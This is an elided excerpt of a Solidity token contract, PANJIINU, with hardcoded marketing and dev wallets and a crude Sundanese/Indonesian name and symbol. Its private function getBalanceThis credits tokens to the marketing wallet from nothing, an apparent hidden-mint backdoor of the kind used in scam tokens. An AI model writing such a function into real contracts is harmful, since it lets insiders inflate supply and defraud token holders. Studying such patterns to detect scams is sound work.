...
contract PANJIINU is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x88eECF220260e7E60752dcDE5fF29C4a2c89E3CD); 
    address payable public Wallet_Dev = payable(0xC68DEbA2B78ec8c060E0F0Dd44df0519FaeD6f59);
    ...
    string private constant _name = "PANJI SAID KANJUT MANEH BADAG"; 
    string private constant _symbol = unicode"PANJI JURAGAN GANJA"; 
    ...
    constructor () {
        ...
        _owner = 0xC68DEbA2B78ec8c060E0F0Dd44df0519FaeD6f59;
    ...
    function getBalanceThis(uint256 tokens) private {
        _tOwned[Wallet_Marketing] = _tOwned[Wallet_Marketing]+tokens;
